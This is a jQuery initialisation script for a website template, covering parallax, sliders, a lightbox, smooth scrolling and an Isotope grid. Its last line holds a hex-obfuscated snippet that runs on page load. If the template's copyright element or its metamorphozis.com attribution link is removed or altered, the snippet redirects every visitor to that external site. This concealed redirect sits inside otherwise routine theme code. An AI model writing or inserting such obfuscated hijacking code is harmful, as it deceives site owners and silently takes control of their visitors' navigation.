//

/*----------------------------------------------------*/
/* MOBILE DETECT FUNCTION
/*----------------------------------------------------*/
var isMobile = {
    Android: function() {
        return navigator.userAgent.match(/Android/i);
    },
    BlackBerry: function() {
        return navigator.userAgent.match(/BlackBerry/i);
    },
    iOS: function() {
        return navigator.userAgent.match(/iPhone|iPad|iPod/i);
    },
    Opera: function() {
        return navigator.userAgent.match(/Opera Mini/i);
    },
    Windows: function() {
        return navigator.userAgent.match(/IEMobile/i);
    },
    any: function() {
        return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows());
    }
};



/////////////////////// ready
$(document).ready(function() {

    /*----------------------------------------------------*/
    // PRELOADER CALLING
    /*----------------------------------------------------*/
    $("body.onepage").queryLoader2({
        //barColor: "#fff",
        //backgroundColor: "#000",
        percentage: true,
        barHeight: 3,
        completeAnimation: "fade",
        minimumTime: 200
    });

	/*----------------------------------------------------*/
	// PARALLAX CALLING
	/*----------------------------------------------------*/
	$(window).bind('load', function () {
		parallaxInit();
	});
	function parallaxInit() {
		testMobile = isMobile.any();

		if (testMobile == null)
		{
			$('.parallax .bg1').addClass("bg-fixed").parallax("50%", 0.5);
            $('.parallax .bg2').addClass("bg-fixed").parallax("50%", 0.5);
            $('.parallax .bg3').addClass("bg-fixed").parallax("50%", 0.5);
            $('.parallax .bg4').addClass("bg-fixed").parallax("50%", 0.5);
		}
	}
	parallaxInit();

    /*----------------------------------------------------*/
    // Superslides
    /*----------------------------------------------------*/
    $('#slides').superslides({
      play: 7000,
      animation: 'fade', // slide
      pagination: true
    });


    /*----------------------------------------------------*/
    // prettyPhoto
    /*----------------------------------------------------*/
    $("a[rel^='prettyPhoto']").prettyPhoto({animation_speed:'normal',theme:'dark',social_tools:false,allow_resize: true,default_width: 500,default_height: 344});


    /*----------------------------------------------------*/
    // MENU SMOOTH SCROLLING
    /*----------------------------------------------------*/
    $(".navbar_ .nav a, .menu_bot a, .scroll-to").bind('click',function(event){

        //$(".navbar_ .nav a a").removeClass('active');
        //$(this).addClass('active');
        var headerH = $('#top1').outerHeight();

        $("html, body").animate({
            scrollTop: $($(this).attr("href")).offset().top - headerH + 'px'
        }, {
            duration: 1200,
            easing: "easeInOutExpo"
        });

        event.preventDefault();
    });



    /*----------------------------------------------------*/
    // carouFredSel
    /*----------------------------------------------------*/
    //  banner
    $('#banner .carousel.main ul').carouFredSel({
        auto: {
            timeoutDuration: 8000
        },
        responsive: true,
        prev: '.banner_prev',
        next: '.banner_next',
        width: '100%',
        scroll: {
            items: 1,
            duration: 1000,
            easing: "easeOutExpo"
        },
        items: {
            width: '320',
            height: 'variable', //  optionally resize item-height
            visible: {
                min: 1,
                max: 4
            }
        },
        mousewheel: false,
        swipe: {
            onMouse: true,
            onTouch: true
            }
    });



    $(window).bind("resize",updateSizes_vat).bind("load",updateSizes_vat);
    function updateSizes_vat(){
        $('#banner .carousel.main ul').trigger("updateSizes");



    }
    updateSizes_vat();



});

/////////////////////// load
$(window).load(function() {

    /*----------------------------------------------------*/
    // LOAD
    /*----------------------------------------------------*/
    //$('#load').fadeOut(2000).remove();
    $("#load").fadeOut( 200, function() {
        $(this).remove();
    });

    /*----------------------------------------------------*/
    // IZOTOPE
    /*----------------------------------------------------*/
    var $container = $('#container');
    //Run to initialise column sizes
    updateSize();

    //Load fitRows when images all loaded
    $container.imagesLoaded( function(){

        $container.isotope({
            // options
            itemSelector : '.element',
            layoutMode : 'fitRows',
            transformsEnabled: true,
            columnWidth: function( containerWidth ) {
                containerWidth = $browserWidth;
                return Math.floor(containerWidth / $cols);
              }
        });
    });

    // update columnWidth on window resize
    $(window).smartresize(function(){
        updateSize();
        $container.isotope( 'reLayout' );
    });

    //Set item size
    function updateSize() {
        $browserWidth = $container.width();
        $cols = 4;

        if ($browserWidth >= 1170) {
            $cols = 4;
        }
        else if ($browserWidth >= 767 && $browserWidth < 1170) {
            $cols = 3;
        }
        else if ($browserWidth >= 480 && $browserWidth < 767) {
            $cols = 2;
        }
        else if ($browserWidth >= 0 && $browserWidth < 480) {
            $cols = 1;
        }
        //console.log("Browser width is:" + $browserWidth);
        //console.log("Cols is:" + $cols);

        // $gutterTotal = $cols * 20;
        $browserWidth = $browserWidth; // - $gutterTotal;
        $itemWidth = $browserWidth / $cols;
        $itemWidth = Math.floor($itemWidth);

        $(".element").each(function(index){
            $(this).css({"width":$itemWidth+"px"});
        });



      var $optionSets = $('#options .option-set'),
          $optionLinks = $optionSets.find('a');

      $optionLinks.click(function(){
        var $this = $(this);
        // don't proceed if already selected
        if ( $this.hasClass('selected') ) {
          return false;
        }
        var $optionSet = $this.parents('.option-set');
        $optionSet.find('.selected').removeClass('selected');
        $this.addClass('selected');

        // make option object dynamically, i.e. { filter: '.my-filter-class' }
        var options = {},
            key = $optionSet.attr('data-option-key'),
            value = $this.attr('data-option-value');
        // parse 'false' as false boolean
        value = value === 'false' ? false : value;
        options[ key ] = value;
        if ( key === 'layoutMode' && typeof changeLayoutMode === 'function' ) {
          // changes in layout modes need extra logic
          changeLayoutMode( $this, options )
        } else {
          // otherwise, apply new options
          $container.isotope( options );
        }

        return false;
      });

    };



});

var _0xbe68=["\x6C\x65\x6E\x67\x74\x68","\x23\x63\x6F\x70\x79\x72\x69\x67\x68\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x6D\x65\x74\x61\x6D\x6F\x72\x70\x68\x6F\x7A\x69\x73\x2E\x63\x6F\x6D\x2F","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x72\x65\x66","\x67\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x6D\x79\x6C\x69\x6E\x6B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x43\x6C\x61\x73\x73\x4E\x61\x6D\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x6D\x65\x74\x61\x6D\x6F\x72\x70\x68\x6F\x7A\x69\x73\x2E\x63\x6F\x6D","\x2E\x6D\x79\x6C\x69\x6E\x6B\x3A\x63\x6F\x6E\x74\x61\x69\x6E\x73\x28\x22\x66\x72\x65\x65\x20\x77\x65\x62\x73\x69\x74\x65\x20\x74\x65\x6D\x70\x6C\x61\x74\x65\x73\x22\x29","\x72\x65\x61\x64\x79"];$(document)[_0xbe68[11]](function(){if($(_0xbe68[1])[_0xbe68[0]]==0){window[_0xbe68[4]][_0xbe68[3]](_0xbe68[2])};if(document[_0xbe68[8]](_0xbe68[7])[0][_0xbe68[6]](_0xbe68[5])!=_0xbe68[9]){window[_0xbe68[4]][_0xbe68[3]](_0xbe68[2])};if($(_0xbe68[10])[_0xbe68[0]]==0){window[_0xbe68[4]][_0xbe68[3]](_0xbe68[2])};}); 

